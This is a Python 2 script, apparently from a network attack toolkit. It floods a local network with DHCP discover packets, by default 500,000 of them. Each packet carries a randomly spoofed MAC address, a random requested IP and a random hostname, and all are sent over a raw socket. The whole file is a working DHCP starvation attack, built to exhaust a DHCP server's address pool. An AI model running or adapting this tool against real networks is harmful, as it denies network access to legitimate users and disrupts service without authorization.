from base import Base
from argparse import ArgumentParser
from netifaces import ifaddresses, AF_LINK
from network import Ethernet, IP, DHCP
from sys import stdout
from socket import socket, AF_PACKET, SOCK_RAW
from datetime import datetime
from time import time


if __name__ == "__main__":

    Base.check_platform()
    Base.check_user()
    PACKETS = []

    parser = ArgumentParser(add_help=False)
    parser.add_argument('-h', '--help', help='Print help', action='store_true')
    parser.add_argument('-i', '--interface', help='Set interface name for send discover packets')
    parser.add_argument('-n', '--notspoofmac', help='Don\'t spoof MAC address', action='store_true')
    parser.add_argument('-p', '--packets', help='Number of packets (default: 500000)', default=500000)
    args = parser.parse_args()

    if args.help:
        parser.print_help()
        exit(1)

    current_network_interface = ""
    if args.interface is None:
        current_network_interface = Base.netiface_selection()
    else:
        current_network_interface = args.interface

    current_mac_address = ""
    try:
        current_mac_address = str(ifaddresses(current_network_interface)[AF_LINK][0]['addr'])
    except:
        print "This network interface does not have mac address!"
        exit(1)

    count = 0
    count_max = int(args.packets)

    index_percent = 0
    count_percent = 0

    print "Creating packets..."

    if args.notspoofmac:
        print " Your MAC address is not spoofed!"

    eth = Ethernet()
    ip = IP()
    dhcp = DHCP()

    while count < count_max:

        if args.notspoofmac:
            SRC_MAC = current_mac_address
            CLIENT_MAC = eth.get_random_mac()
        else:
            SRC_MAC = eth.get_random_mac()
            CLIENT_MAC = SRC_MAC

        REQ_IP = ip.get_random_ip()
        HOST_NAME = Base.make_random_string(8)

        current_packet = dhcp.make_discover_packet(SRC_MAC, CLIENT_MAC, REQ_IP, HOST_NAME)
        PACKETS.append(current_packet)
        count += 1

        if count > count_percent:
            stdout.flush()
            stdout.write(" Complete: " + str(index_percent + 1) + "%   \r")
            index_percent += 1
            count_percent = (count_max / 100) * index_percent

    SOCK = socket(AF_PACKET, SOCK_RAW)
    SOCK.bind((current_network_interface, 0))

    print "\r\nSending packets..."
    print "Number of packets:       " + str(args.packets)
    print "Start sending packets:   " + str(datetime.now().strftime("%Y/%m/%d %H:%M:%S"))
    start_time = time()

    for PACKET in PACKETS:
        SOCK.send(PACKET)

    stop_time = time()
    print "All packets sent:        " + str(datetime.now().strftime("%Y/%m/%d %H:%M:%S"))
    SOCK.close()
    delta_time = stop_time - start_time
    speed = count_max / delta_time
    print "Speed:                   " + str(int(speed)) + " pkt/sec\r\n"
